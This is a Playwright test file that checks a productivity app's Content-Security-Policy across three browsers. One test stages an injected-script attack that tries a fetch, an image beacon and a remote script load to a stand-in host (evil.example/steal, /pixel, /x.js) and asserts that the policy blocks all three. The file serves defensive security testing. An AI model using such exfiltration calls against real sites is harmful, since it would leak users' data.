// Phase 6, bug 32: the Content-Security-Policy, enforced (bypassCSP off). Runs in Chromium, Firefox and WebKit.
// The tracker is never contacted here (it hasn't been connected in this fresh profile), so no tracker fake is needed.
import { test, expect } from "@playwright/test";

test.use({ bypassCSP: false });
const VIEWS = ["today", "focus", "tasks", "timeline", "apps", "reports", "projects", "settings"];

async function open(page) {
  const violations = [], tracker = [];
  page.on("request", r => { if (/:47821\//.test(r.url())) tracker.push(r.url()); });
  await page.route(/fonts\.(googleapis|gstatic)\.com/, r => r.abort());     // no external requests from tests
  await page.addInitScript(() => {
    window.__csp = [];
    document.addEventListener("securitypolicyviolation", e => window.__csp.push(`${e.violatedDirective} ${e.blockedURI}`));
  });
  await page.clock.setFixedTime(new Date("2026-11-10T10:00:00Z"));
  await page.goto("/index.html");
  return { violations, tracker };
}

test("the policy is in place on Keel's own site", async ({ page }) => {
  const { tracker } = await open(page);
  const csp = await page.locator('meta[http-equiv="Content-Security-Policy"]').getAttribute("content");
  for (const part of ["default-src 'self'", "connect-src 'self' http://127.0.0.1:47821 http://localhost:47821", "object-src 'none'", "base-uri 'none'", "form-action 'none'", "frame-src 'none'"])
    expect(csp).toContain(part);
  expect(tracker).toEqual([]);
});

test("every screen works under the policy with no violations", async ({ page }) => {
  const errors = [];
  page.on("pageerror", e => errors.push(e.message));
  const { tracker } = await open(page);
  await page.evaluate(`state.tasks.push({ id: "t1", title: "Write proposal", projectId: "p_work", priority: 3, due: todayKey(), estimate: 45, notes: "", subtasks: [], done: false, createdAt: 1 }); state.plan = buildPlan(); state.plan.accepted = true; commit();`);
  for (const v of VIEWS) {
    await page.locator(`#nav [data-view="${v}"]`).click();
    await expect(page.locator("#nav [aria-current='page']")).toHaveAttribute("data-view", v);
  }
  await page.locator('#nav [data-view="tasks"]').click();
  await page.locator('[data-form="quick-add"] input').first().fill("Call the bank tomorrow 15m");
  await page.keyboard.press("Enter");
  await expect.poll(() => page.evaluate("state.tasks.some(t => t.title === 'Call the bank')")).toBe(true);
  expect(await page.evaluate(() => window.__csp)).toEqual([]);
  expect(errors).toEqual([]);
  expect(tracker).toEqual([]);
});

test("an injected script couldn't send data to another site", async ({ page }) => {
  await open(page);
  const attempts = await page.evaluate(async () => {
    const out = {};
    try { await fetch("https://evil.example/steal?d=1"); out.fetch = "sent"; } catch { out.fetch = "blocked"; }
    await new Promise(r => { const i = new Image(); i.onload = i.onerror = r; i.src = "https://evil.example/pixel?d=1"; });
    const s = document.createElement("script"); s.src = "https://evil.example/x.js"; document.head.appendChild(s);
    await new Promise(r => setTimeout(r, 300));
    out.violations = [...new Set(window.__csp.map(v => v.split(" ")[0]))].sort();
    return out;
  });
  expect(attempts.fetch).toBe("blocked");
  // Browsers name the script directive "script-src" or "script-src-elem".
  expect(attempts.violations.map(v => v.replace(/-elem$/, ""))).toEqual(expect.arrayContaining(["connect-src", "img-src", "script-src"]));
});
